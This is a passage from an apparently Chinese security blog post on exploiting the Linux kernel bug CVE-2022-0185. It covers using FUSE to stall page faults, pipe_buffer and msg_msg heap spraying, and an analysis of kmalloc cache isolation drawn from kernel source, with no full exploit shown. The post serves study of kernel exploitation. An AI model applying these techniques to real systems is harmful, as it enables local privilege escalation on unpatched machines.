fuse_file_info *);</span><br><span class="line">	<span class="keyword">int</span> (*fsync) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">int</span>, struct fuse_file_info *);</span><br><span class="line">	<span class="keyword">int</span> (*setxattr) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">size_t</span>, <span class="keyword">int</span>);</span><br><span class="line">	<span class="keyword">int</span> (*getxattr) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">char</span> *, <span class="keyword">size_t</span>);</span><br><span class="line">	<span class="keyword">int</span> (*listxattr) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">char</span> *, <span class="keyword">size_t</span>);</span><br><span class="line">	<span class="keyword">int</span> (*removexattr) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">const</span> <span class="keyword">char</span> *);</span><br><span class="line">	<span class="keyword">int</span> (*opendir) (<span class="keyword">const</span> <span class="keyword">char</span> *, struct fuse_file_info *);</span><br><span class="line">	<span class="keyword">int</span> (*readdir) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">void</span> *, <span class="keyword">fuse_fill_dir_t</span>, <span class="keyword">off_t</span>,</span><br><span class="line">			struct fuse_file_info *, <span class="keyword">enum</span> fuse_readdir_flags);</span><br><span class="line">	<span class="keyword">int</span> (*releasedir) (<span class="keyword">const</span> <span class="keyword">char</span> *, struct fuse_file_info *);</span><br><span class="line">	<span class="keyword">int</span> (*fsyncdir) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">int</span>, struct fuse_file_info *);</span><br><span class="line">	<span class="keyword">void</span> *(*init) (struct fuse_conn_info *conn,</span><br><span class="line">		       struct fuse_config *cfg);</span><br><span class="line">	<span class="keyword">void</span> (*destroy) (<span class="keyword">void</span> *private_data);</span><br><span class="line">	<span class="keyword">int</span> (*access) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">int</span>);</span><br><span class="line">	<span class="keyword">int</span> (*create) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">mode_t</span>, struct fuse_file_info *);</span><br><span class="line">	<span class="keyword">int</span> (*lock) (<span class="keyword">const</span> <span class="keyword">char</span> *, struct fuse_file_info *, <span class="keyword">int</span> cmd,</span><br><span class="line">		     struct flock *);</span><br><span class="line">	 <span class="keyword">int</span> (*utimens) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">const</span> struct timespec tv[<span class="number">2</span>],</span><br><span class="line">			 struct fuse_file_info *fi);</span><br><span class="line">	<span class="keyword">int</span> (*bmap) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">size_t</span> blocksize, <span class="keyword">uint64_t</span> *idx);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> FUSE_USE_VERSION &lt; 35</span></span><br><span class="line">	<span class="keyword">int</span> (*ioctl) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">int</span> cmd, <span class="keyword">void</span> *arg,</span><br><span class="line">		      struct fuse_file_info *, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags, <span class="keyword">void</span> *data);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">	<span class="keyword">int</span> (*ioctl) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">void</span> *arg,</span><br><span class="line">		      struct fuse_file_info *, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags, <span class="keyword">void</span> *data);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">int</span> (*poll) (<span class="keyword">const</span> <span class="keyword">char</span> *, struct fuse_file_info *,</span><br><span class="line">		     struct fuse_pollhandle *ph, <span class="keyword">unsigned</span> *reventsp);</span><br><span class="line">	<span class="keyword">int</span> (*write_buf) (<span class="keyword">const</span> <span class="keyword">char</span> *, struct fuse_bufvec *buf, <span class="keyword">off_t</span> off,</span><br><span class="line">			  struct fuse_file_info *);</span><br><span class="line">	<span class="keyword">int</span> (*read_buf) (<span class="keyword">const</span> <span class="keyword">char</span> *, struct fuse_bufvec **bufp,</span><br><span class="line">			 <span class="keyword">size_t</span> size, <span class="keyword">off_t</span> off, struct fuse_file_info *);</span><br><span class="line">	<span class="keyword">int</span> (*flock) (<span class="keyword">const</span> <span class="keyword">char</span> *, struct fuse_file_info *, <span class="keyword">int</span> op);</span><br><span class="line">	<span class="keyword">int</span> (*fallocate) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">int</span>, <span class="keyword">off_t</span>, <span class="keyword">off_t</span>,</span><br><span class="line">			  struct fuse_file_info *);</span><br><span class="line">	<span class="keyword">ssize_t</span> (*copy_file_range) (<span class="keyword">const</span> <span class="keyword">char</span> *path_in,</span><br><span class="line">				    struct fuse_file_info *fi_in,</span><br><span class="line">				    <span class="keyword">off_t</span> offset_in, <span class="keyword">const</span> <span class="keyword">char</span> *path_out,</span><br><span class="line">				    struct fuse_file_info *fi_out,</span><br><span class="line">				    <span class="keyword">off_t</span> offset_out, <span class="keyword">size_t</span> size, <span class="keyword">int</span> flags);</span><br><span class="line">	<span class="keyword">off_t</span> (*lseek) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">off_t</span> off, <span class="keyword">int</span> whence, struct fuse_file_info *);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>在使用时需要先实现上面函数表中的函数接口，我们自定义的用户态文件系统的操作其实都是通过对该函数表中定义的函数回调实现的。</p>
<p>不难想到，注册一个用户空间文件系统，为读写等接口注册回调函数，使用 mmap 将该文件系统中的一个文件映射到内存中，当进程在内核中读写这块 mmap 内存时，便会触发缺页异常，此时控制权便会转交到我们注册的回调函数当中，然而在回调函数中的操作是我们可以控制的，所以效果就很类似于<code>userfaultfd</code>了。</p>
<p>不过常规的 libfuse 库并不支持静态编译，这使得我们无法像以往一样先静态编译一个 exp 再传到远程，不过在此CVE的github仓库中存在其静态编译的操作。<a class="link"   target="_blank" rel="noopener" href="https://github.com/Crusaders-of-Rust/CVE-2022-0185" >https://github.com/Crusaders-of-Rust/CVE-2022-0185<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="pipe-buffer"><a href="#pipe-buffer" class="headerlink" title="pipe_buffer"></a>pipe_buffer</h3><p>这里有两种利用方式，首先就是我们在 <a class="link"   target="_blank" rel="noopener" href="https://cv196082.gitee.io/2023/05/24/pipe-buffer/" >向pipe_buffer说yes！<i class="fas fa-external-link-alt"></i></a> 文章中提到的使用<code>pipe_buffer</code>构造出页级的UAF，最终实现任意地址读写。这里简单介绍一下在这个漏洞中如何使用就行，不过多停留了 <del>绝对不是因为我是懒狗不想写exp</del> ，这篇文章重点还是看<code>FUSE</code>的用法，所以具体还是在另一种利用手法。</p>
<p>首先，在开始<code>size = 4095</code>时即便是传入的<code>key</code>为<code>\x00</code>时也会在下一个<code>object</code>中写入一个<code>&quot;=&quot;</code>，所以不幸的是不能直接修改下一个紧邻的<code>pipe_buffer-&gt;page</code>。前面也提到了这里选择的方式修改下一个<code>object</code>紧邻的下一个<code>object</code>，不过我们如果单纯使用<code>pipe_buffer</code>进行堆喷时会出现一个问题，在后续寻找被覆盖<code>page</code>指针的<code>pipe_buffer</code>的<code>idx</code>时会出现一个大问题，那就是因为前面修改导致读取<code>pipe</code>时导致<code>kernel panic</code>。所以a3选择的办法是使用<code>msg_msg</code>进行大量堆喷，通过修改<code>m_ts</code>来判断哪个<code>msg_msg</code>是被覆盖掉了，之后这个<code>msg_msg</code>就不再使用防止出现<code>kernel panic</code>，那此时也就成功将漏洞转化成了<code>off by null</code>了，后续的使用其实就和上面的文章中一致了，不熟悉的朋友可以去看看。</p>
<p>当然这里还需要考虑的就是<code>order</code>了，此处申请的<code>object</code>对应的<code>order</code>为3。当然，各位知道知道的<code>pipe</code>提供<code>fcntl(F_SETPIPE_SZ)</code>调用可以去修改<code>pipe_buffer</code>的数量，所以可以达到对应的<code>order</code>当然<code>msg_msg</code>同理。</p>
<h3 id="内部隔离分析"><a href="#内部隔离分析" class="headerlink" title="内部隔离分析"></a>内部隔离分析</h3><p>在看完第一种利用方式的朋友们可能会有点疑惑，”为什么可以使用<code>msg_msg</code>？”。在ctf-wiki中写了”在linux kernel 5.9之前和linux kernel 5.11之后都是存在堆块隔离的”。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">kmalloc_cache_type</span> &#123;</span></span><br><span class="line">	KMALLOC_NORMAL = <span class="number">0</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CONFIG_ZONE_DMA</span></span><br><span class="line">	KMALLOC_DMA = KMALLOC_NORMAL,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CONFIG_MEMCG_KMEM</span></span><br><span class="line">	KMALLOC_CGROUP = KMALLOC_NORMAL,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">	KMALLOC_CGROUP,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	KMALLOC_RECLAIM,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_ZONE_DMA</span></span><br><span class="line">	KMALLOC_DMA,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	NR_KMALLOC_TYPES</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>在kernel 5.14之后存在如上的<code>cache type</code>，其中常被认为隔离的是<code>KMALLOC_CGROUPT</code>其对应的是flag为<code>GFP_KERNEL_ACCOUNT</code>的申请，可以在<code>slabinfo</code>文件中看到其cache的名字为<code>kmalloc-cg-*</code>。而<code>GFP_KERNEL</code>则对应的就是<code>KMALLOC_NORMAL</code>类型，在<code>slabinfo</code>中就是普通的<code>kmalloc-*</code>。</p>
<p><strong>下面简单介绍一下内存隔离的原理：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *<span class="title">kmalloc</span><span class="params">(<span class="keyword">size_t</span> size, <span class="keyword">gfp_t</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (__builtin_constant_p(size)) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CONFIG_SLOB</span></span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">int</span> index;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">		<span class="keyword">if</span> (size &gt; KMALLOC_MAX_CACHE_SIZE)</span><br><span class="line">			<span class="keyword">return</span> kmalloc_large(size, flags);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CONFIG_SLOB</span></span><br><span class="line">		index = kmalloc_index(size);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!index)</span><br><span class="line">			<span class="keyword">return</span> ZERO_SIZE_PTR;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> kmem_cache_alloc_trace(</span><br><span class="line">				kmalloc_caches[kmalloc_type(flags)][index],</span><br><span class="line">				flags, size);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> __kmalloc(size, flags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在内核<code>kmalloc</code>的实现里面可以看到的是，会给<code>kmem_cache_alloc_trace</code>传入一个cache，另外<code>kmalloc_caches</code>是一个二重数组，首先是根据对应的<code>type</code>然后根据<code>size</code>确定不同的<code>index</code>取出最终的<code>cache</code>。</p>
<p>这里重点看一下<code>kmalloc_type</code>函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KMALLOC_NOT_NORMAL_BITS					\</span></span><br><span class="line"><span class="meta">	(__GFP_RECLAIMABLE |					\</span></span><br><span class="line"><span class="meta">	(IS_ENABLED(CONFIG_ZONE_DMA)   ? __GFP_DMA : 0) |	\</span></span><br><span class="line"><span class="meta">	(IS_ENABLED(CONFIG_MEMCG_KMEM) ? __GFP_ACCOUNT : 0))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">enum</span> kmalloc_cache_type <span class="title">kmalloc_type</span><span class="params">(<span class="keyword">gfp_t</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * The most common case is KMALLOC_NORMAL, so test for it</span></span><br><span class="line"><span class="comment">	 * with a single branch for all the relevant flags.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (likely((flags &amp; KMALLOC_NOT_NORMAL_BITS) == <span class="number">0</span>))</span><br><span class="line">		<span class="keyword">return</span> KMALLOC_NORMAL;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * At least one of the flags has to be set. Their priorities in</span></span><br><span class="line"><span class="comment">	 * decreasing order are:</span></span><br><span class="line"><span class="comment">	 *  1) __GFP_DMA</span></span><br><span class="line"><span class="comment">	 *  2) __GFP_RECLAIMABLE</span></span><br><span class="line"><span class="comment">	 *  3) __GFP_ACCOUNT</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (IS_ENABLED(CONFIG_ZONE_DMA) &amp;&amp; (flags &amp; __GFP_DMA))</span><br><span class="line">		<span class="keyword">return</span> KMALLOC_DMA;</span><br><span class="line">	<span class="keyword">if</span> (!IS_ENABLED(CONFIG_MEMCG_KMEM) || (flags &amp; __GFP_RECLAIMABLE))</span><br><span class="line">		<span class="keyword">return</span> KMALLOC_RECLAIM;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">return</span> KMALLOC_CGROUP;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里主要看一下<code>KMALLOC_NOT_NORMAL_BITS</code>的定义，因为kernel默认存在<code>CONFIG_MEMCG_KMEM</code>选项所以添加了<code>__GFP_ACCOUNT</code>标识为，以至于flag为<code>GFP_KERNEL_ACCOUNT</code>时不会直接返回<code>KMALLOC_NORMAL</code>了，这也就导致了堆块隔离。</p>
<p>根据上面的分析会发现在<code>linux kernel 5.9</code>之前确实没有<code>KMALLOC_CGROUP</code>这样一个新建的<code>kmem_cache</code>，不过其实在此之前依旧是存在隔离的，这里分析一下在<code>linux kernel 5.9</code>之前的隔离实现原理。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> __<span class="title">percpu</span> *<span class="title">cpu_slab</span>;</span></span><br><span class="line">	<span class="comment">/* Used for retrieving partial slabs, etc. */</span></span><br><span class="line">	<span class="keyword">slab_flags_t</span> flags;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> min_partial;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> size;	<span class="comment">/* The size of an object including metadata */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> object_size;<span class="comment">/* The size of an object without metadata */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> offset;	<span class="comment">/* Free pointer offset */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span></span><br><span class="line">	<span class="comment">/* Number of per cpu partial objects to keep around */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> cpu_partial;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">oo</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Allocation and freeing of slabs */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">max</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">min</span>;</span></span><br><span class="line">	<span class="keyword">gfp_t</span> allocflags;	<span class="comment">/* gfp flags to use on each alloc */</span></span><br><span class="line">	<span class="keyword">int</span> refcount;		<span class="comment">/* Refcount for slab cache destroy */</span></span><br><span class="line">	<span class="keyword">void</span> (*ctor)(<span class="keyword">void</span> *);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> inuse;		<span class="comment">/* Offset to metadata */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> align;		<span class="comment">/* Alignment */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> red_left_pad;	<span class="comment">/* Left redzone padding size */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span> *name;	<span class="comment">/* Name (only for display!) */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span>	<span class="comment">/* List of slab caches */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SYSFS</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kobject</span> <span class="title">kobj</span>;</span>	<span class="comment">/* For sysfs */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">kobj_remove_work</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MEMCG</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">memcg_cache_params</span> <span class="title">memcg_params</span>;</span></span><br><span class="line">	<span class="comment">/* For propagation, maximum size of a stored attr */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> max_attr_size;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SYSFS</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kset</span> *<span class="title">memcg_kset</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> random;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Defragmentation by allocating from a remote node.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> remote_node_defrag_ratio;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLAB_FREELIST_RANDOM</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> *random_seq;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KASAN</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kasan_cache</span> <span class="title">kasan_info</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> useroffset;	<span class="comment">/* Usercopy region offset */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> usersize;		<span class="comment">/* Usercopy region size */</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> *<span class="title">node</span>[<span class="title">MAX_NUMNODES</span>];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>在之前的<code>kmem_cache</code>结构体的定义如上，可以看到的是内部会根据是否开启了<code>MEMCG</code>这个选项来添加<code>struct memcg_cache_params memcg_params;</code>这样一个额外的结构体。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">memcg_cache_params</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">root_cache</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">memcg_cache_array</span> __<span class="title">rcu</span> *<span class="title">memcg_caches</span>;</span></span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> __<span class="title">root_caches_node</span>;</span></span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">children</span>;</span></span><br><span class="line">			<span class="keyword">bool</span> dying;</span><br><span class="line">		&#125;;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">mem_cgroup</span> *<span class="title">memcg</span>;</span></span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">children_node</span>;</span></span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">kmem_caches_node</span>;</span></span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">percpu_ref</span> <span class="title">refcnt</span>;</span></span><br><span class="line"></span><br><span class="line">			<span class="keyword">void</span> (*work_fn)(struct kmem_cache *);</span><br><span class="line">			<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">				<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu_head</span>;</span></span><br><span class="line">				<span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">work</span>;</span></span><br><span class="line">			&#125;;</span><br><span class="line">		&#125;;</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>可以看到的是首先会存放一个根slab的指针，在<code>memcg_caches</code>这里存放若干个子<code>memcg slab</code>管理结构。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">memcg_cache_array</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">entries</span>[0];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>也就是说其可以通过根slab和子slab互相寻找。在上面这里结构体的定义中<code>entries</code>就是用于存放<code>memcg slab</code>的数组。所以可以理解为每一个根slab管理结构(根slab管理结构根据大小分类)都有一个对应的子memcg slab列表。</p>
<p>上面多为理论中的内容，下面讨论一下在实际面对时所遇到的问题：</p>
<p>在这个CVE中，所使用的所有分配对象的函数都为<code>kmalloc</code>那么这里先从这里看起</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *<span class="title">kmalloc</span><span class="params">(<span class="keyword">size_t</span> size, <span class="keyword">gfp_t</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (__builtin_constant_p(size)) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CONFIG_SLOB</span></span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">int</span> index;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">		<span class="keyword">if</span> (size &gt; KMALLOC_MAX_CACHE_SIZE)</span><br><span class="line">			<span class="keyword">return</span> kmalloc_large(size, flags);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CONFIG_SLOB</span></span><br><span class="line">		index = kmalloc_index(size);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!index)</span><br><span class="line">			<span class="keyword">return</span> ZERO_SIZE_PTR;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> kmem_cache_alloc_trace(</span><br><span class="line">				kmalloc_caches[kmalloc_type(flags)][index],</span><br><span class="line">				flags, size);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> __kmalloc(size, flags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到上面在分为了两条分支，根据的是size是否为定量，那么根据这个cve正好会分别进入上面的两条分支中。在分配<code>msg_msg</code>时会进入到下面的<code>__kmalloc</code>函数中，在分配<code>ctx-&gt;legacy_data</code>时则会进入到上面的分支中。</p>
